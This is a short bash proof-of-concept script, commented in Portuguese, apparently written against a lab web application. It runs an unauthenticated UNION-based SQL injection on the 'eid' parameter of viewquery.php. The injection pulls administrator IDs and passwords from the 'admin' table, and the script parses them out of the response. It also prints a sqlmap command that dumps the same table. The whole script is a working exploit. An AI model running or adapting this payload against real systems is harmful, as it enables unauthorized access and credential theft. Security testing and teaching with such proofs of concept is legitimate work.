#!/usr/bin/env bash
# PoC — SQLi UNION em viewquery.php?eid (contexto string, query=4 colunas)
set -u
T="${1:-http://192.168.95.131:9292}"
echo "[*] Alvo: $T (sem autenticação)"
curl -s -G "$T/viewquery.php" \
  --data-urlencode "eid=' UNION SELECT concat(0x5b,Aid,0x3a,Apass,0x5d),2,3,4 FROM admin-- -" \
  | grep -oE "\[[^]]*:[^]]*\]" | sed 's/^/    /'
echo "[*] sqlmap: sqlmap -u \"$T/viewquery.php?eid=harsh@ics.com\" -p eid --batch --dump -T admin"
